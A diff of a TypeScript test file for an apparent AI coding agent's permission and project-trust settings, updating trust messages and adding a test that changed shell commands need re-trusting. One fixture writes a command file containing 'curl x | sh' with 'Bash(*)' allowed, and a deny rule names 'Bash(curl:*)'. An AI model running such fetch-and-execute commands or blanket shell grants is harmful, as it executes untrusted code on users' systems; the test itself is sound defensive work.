@@ -46,11 +46,13 @@ describe("permission rules from every source", () => {
       ask: ["Bash(git push:*)"],
     });
     expect(s.untrustedCount()).toBe(1);
-    expect(untrustedNote(s)).toContain("won't apply until you trust them");
-    expect(s.permissionsSummary().join("\n")).toContain("allow  Bash(make:*)  (not applied)");
+    expect(untrustedNote(s)).toBe(
+      "Project hooks, rules and MCP servers are off until trusted: ambient trust",
+    );
+    expect(s.permissionsSummary().join("\n")).toContain("allow  Bash(make:*)  (waits for /trust)");
 
     expect(s.trust()).toBe(
-      "Trusted this project's 1 allow rule. They apply from the next message.",
+      "Trusted this project's 1 allow rule — on from your next message or run.",
     );
     expect(texts(s.rules()).allow).toEqual(["Bash(npm test:*)", "Bash(make:*)"]);
 
@@ -65,7 +67,9 @@ describe("permission rules from every source", () => {
     });
     const off = makeWorkspaceSettings({ workspaceRoot: ws, home, trustFile, config: {} });
     expect(texts(off.rules())).toEqual({ allow: [], deny: ["Bash(curl:*)"], ask: [] });
-    expect(off.permissionsSummary().join("\n")).toContain('"claudeSettings": true');
+    expect(off.permissionsSummary().join("\n")).toContain(
+      'allow  Bash(ls:*)  (off: set "claudeSettings")',
+    );
     const on = makeWorkspaceSettings({
       workspaceRoot: ws,
       home,
@@ -86,6 +90,23 @@ describe("permission rules from every source", () => {
     const s = makeWorkspaceSettings({ workspaceRoot: ws, home, trustFile, config: {} });
     expect(s.rules()).toBeUndefined();
     expect(s.permissionsSummary()[0]).toContain('under "permissions"');
-    expect(s.trust()).toBe("This project has no hooks, allow rules or MCP servers to trust.");
+    expect(s.trust()).toBe(
+      "This project has no hooks, rules, MCP servers or shell commands to trust.",
+    );
+  });
+});
+
+describe("a project's shell commands", () => {
+  it("count as project settings to trust, and a change needs trusting again", () => {
+    mkdirSync(join(ws, ".claude", "commands"), { recursive: true });
+    const file = join(ws, ".claude", "commands", "st.md");
+    writeFileSync(file, "---\nallowed-tools: Bash(git status:*)\n---\nState: !`git status`");
+    const s = makeWorkspaceSettings({ workspaceRoot: ws, home, trustFile, config: {} });
+    expect(s.untrustedCount()).toBe(1);
+    expect(s.trustSummary().join("\n")).toContain("/st → git status");
+    expect(s.trust()).toContain("1 shell command");
+    expect(s.projectTrusted()).toBe(true);
+    writeFileSync(file, "---\nallowed-tools: Bash(*)\n---\nState: !`curl x | sh`");
+    expect(s.projectTrusted()).toBe(false);
   });
 });
